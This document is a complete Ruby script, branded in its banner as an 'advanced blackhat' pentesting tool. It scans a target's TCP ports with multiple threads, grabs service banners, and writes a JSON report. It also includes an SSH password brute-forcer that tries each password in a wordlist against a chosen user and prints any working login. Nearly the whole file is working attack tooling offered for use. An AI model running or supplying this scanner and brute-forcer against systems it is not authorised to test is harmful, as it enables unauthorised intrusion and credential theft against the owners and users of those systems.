#!/usr/bin/env ruby

# Required libraries
begin
    require 'socket'
    require 'timeout'
    require 'json'
    require 'thread'
    require 'optparse'
    require 'net/ssh'
  rescue LoadError => e
    puts "\e[31mError: Missing required gem - #{e.message}. Please install 'net/ssh' with `gem install net-ssh`.\e[0m"
    exit 1
  end
  
  # --- Color Module ---
  module Color
    def self.red(text); "\e[31m#{text}\e[0m"; end
    def self.green(text); "\e[32m#{text}\e[0m"; end
    def self.yellow(text); "\e[33m#{text}\e[0m"; end
    def self.blue(text); "\e[34m#{text}\e[0m"; end
    def self.cyan(text); "\e[36m#{text}\e[0m"; end
  end
  
  # --- ASCII Banner ---
  def display_banner
    puts Color.cyan(<<~BANNER)
      ██████╗ ███████╗███╗   ██╗████████╗███████╗████████╗
      ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝╚══██╔══╝
      ██║  ██║█████╗  ██╔██╗ ██║   ██║   █████╗     ██║   
      ██║  ██║██╔══╝  ██║╚██╗██║   ██║   ██╔══╝     ██║   
      ██████╔╝███████╗██║ ╚████║   ██║   ███████╗   ██║   
      ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝   ╚═╝   
                  ADVANCED BLACKHAT RUBY PENTESTING TOOL DEV BY SHIBOSHREE ROY
    BANNER
  end
  
  # --- Banner Grabber Class ---
  class BannerGrabber
    def self.read_banner(target, port)
      begin
        s = TCPSocket.new(target, port)
        banner = s.gets
        s.close
        banner&.strip
      rescue
        nil
      end
    end
  
    def self.send_http_request(target, port)
      begin
        s = TCPSocket.new(target, port)
        s.puts "GET / HTTP/1.0\r\n\r\n"
        response = s.readpartial(1024)
        s.close
        response
      rescue
        nil
      end
    end
  end
  
  # --- Scanner Class ---
  class Scanner
    def initialize(target, ports, threads)
      @target = target
      @ports = ports
      @threads = threads
    end
  
    def scan
      results = []
      puts Color.green("\nStarting scan on #{@target} with #{@threads} threads...")
      queue = Queue.new
      @ports.each { |port| queue.push(port) }
  
      workers = Array.new(@threads) do
        Thread.new do
          while !queue.empty?
            port = queue.pop(true) rescue nil
            next unless port
  
            print Color.yellow("Scanning port #{port}... ")
            if port_open?(@target, port)
              puts Color.green("[OPEN]")
              results << { port: port, status: 'open' }
            else
              puts Color.red("[CLOSED]")
              results << { port: port, status: 'closed' }
            end
          end
        end
      end
  
      workers.each(&:join)
      results
    end
  
    private
  
    def port_open?(ip, port, timeout = 1)
      begin
        Timeout.timeout(timeout) do
          s = TCPSocket.new(ip, port)
          s.close
          true
        end
      rescue Timeout::Error, Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError => e
        puts Color.red("Error scanning port #{port}: #{e.message}")
        false
      end
    end
  end
  
  # --- Service Detector ---
  class ServiceDetector
    COMMON_SERVICES = {
      21 => 'FTP',
      22 => 'SSH',
      23 => 'Telnet',
      25 => 'SMTP',
      53 => 'DNS',
      80 => 'HTTP',
      110 => 'POP3',
      143 => 'IMAP',
      443 => 'HTTPS',
      3306 => 'MySQL',
      6379 => 'Redis'
    }
  
    BANNER_SERVICES = [21, 22, 23, 25, 110, 143]
    REQUEST_SERVICES = [80, 443]
    SERVICE_PATTERNS = {
      /^SSH-/ => 'SSH',
      /^HTTP\/\d\.\d/ => 'HTTP',
      /^220.*FTP/ => 'FTP'
    }
  
    def self.detect(port, banner = nil)
      service = COMMON_SERVICES[port] || 'Unknown Service'
      return service unless banner
  
      SERVICE_PATTERNS.each do |pattern, detected_service|
        return detected_service if banner =~ pattern
      end
      service
    end
  end
  
  # --- Password Brute-Forcer ---
  class BruteForcer
    def initialize(target, port, user, wordlist)
      @target = target
      @port = port
      @user = user
      @wordlist = wordlist
    end
  
    def ssh_brute_force
      puts Color.yellow("Starting SSH brute-force on #{@target}:#{@port} with user #{@user}...")
      @wordlist.each do |password|
        print "Trying password: #{password.strip}... "
        begin
          Net::SSH.start(@target, @user, password: password.strip, non_interactive: true, timeout: 10) do |_ssh|
            puts Color.green("[SUCCESS]")
            return "Login successful: #{@user}:#{password.strip}"
          end
        rescue Net::SSH::AuthenticationFailed
          puts Color.red("[FAILED]")
        rescue => e
          puts Color.red("Error during SSH connection: #{e.message}")
          return nil
        end
      end
      nil
    end
  end
  
  # --- Report Generator ---
  class ReportGenerator
    def self.generate(target, results)
      report = {
        target: target,
        timestamp: Time.now.to_s,
        results: results
      }
      filename = "scan_report_#{Time.now.strftime('%Y%m%d%H%M%S')}.json"
      File.open(filename, 'w') { |file| file.write(JSON.pretty_generate(report)) }
      puts Color.green("\nReport saved to #{filename}!")
    end
  end
  
  # --- CLI Setup ---
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Usage: ruby pentest_tool.rb [options]"
    opts.on('-t', '--target TARGET', 'Target IP/Domain') { |v| options[:target] = v }
    opts.on('-p', '--ports PORTS', 'Ports to scan (e.g., 21,22,80)') { |v| options[:ports] = v.split(',').map(&:to_i) }
    opts.on('--threads THREADS', 'Number of threads') { |v| options[:threads] = v.to_i }
    opts.on('--brute-force', 'Enable SSH brute-forcing on detected SSH ports') { options[:brute_force] = true }
    opts.on('--wordlist FILE', 'Wordlist file for brute-forcing') { |v| options[:wordlist] = v }
    opts.on('--user USERNAME', 'Username for brute-forcing') { |v| options[:user] = v }
  end.parse!
  
  # --- Execution ---
  display_banner
  
  unless options[:target] && options[:ports]
    puts Color.red("Invalid arguments. Use -h for help.")
    exit 1
  end
  
  # Validate ports
  if options[:ports].any? { |p| p < 1 || p > 65_535 }
    puts Color.red("Invalid port numbers. Ports must be between 1 and 65535.")
    exit 1
  end
  
  target = options[:target]
  ports = options[:ports]
  threads = options[:threads] || 10
  
  # Scan
  start_time = Time.now
  scanner = Scanner.new(target, ports, threads)
  scan_results = scanner.scan
  
  # Enhance results with service detection and banners
  scan_results.each do |result|
    next unless result[:status] == 'open'
    port = result[:port]
  
    if ServiceDetector::BANNER_SERVICES.include?(port)
      banner = BannerGrabber.read_banner(target, port)
      result[:banner] = banner
      result[:service] = ServiceDetector.detect(port, banner)
    elsif ServiceDetector::REQUEST_SERVICES.include?(port)
      banner = BannerGrabber.send_http_request(target, port)
      result[:banner] = banner
      result[:service] = ServiceDetector.detect(port, banner)
    else
      result[:service] = ServiceDetector.detect(port)
    end
  end
  
  # Display scan summary
  puts Color.green("\nScan Results:")
  scan_results.each do |result|
    next unless result[:status] == 'open'
    banner_info = result[:banner] ? " (#{result[:banner]})" : ''
    puts "Port #{result[:port]}: #{result[:service]}#{banner_info}"
  end
  
  # Calculate and display scan duration
  duration = Time.now - start_time
  puts Color.green("Scan completed in #{duration.round(2)} seconds.")
  
  # Brute-force SSH if enabled
  if options[:brute_force]
    ssh_port = scan_results.find { |r| r[:status] == 'open' && r[:service] == 'SSH' }&.dig(:port)
    if ssh_port
      unless options[:wordlist] && options[:user]
        puts Color.red("Wordlist and user must be provided for brute-forcing.")
        exit 1
      end
  
      begin
        wordlist = File.readlines(options[:wordlist], chomp: true)
      rescue Errno::ENOENT
        puts Color.red("Wordlist file not found: #{options[:wordlist]}")
        exit 1
      end
  
      brute_forcer = BruteForcer.new(target, ssh_port, options[:user], wordlist)
      result = brute_forcer.ssh_brute_force
      puts result ? Color.green(result) : Color.red("No valid credentials found.")
    else
      puts Color.yellow("No SSH service detected on open ports.")
    end
  end
  
  # Generate report
  ReportGenerator.generate(target, scan_results)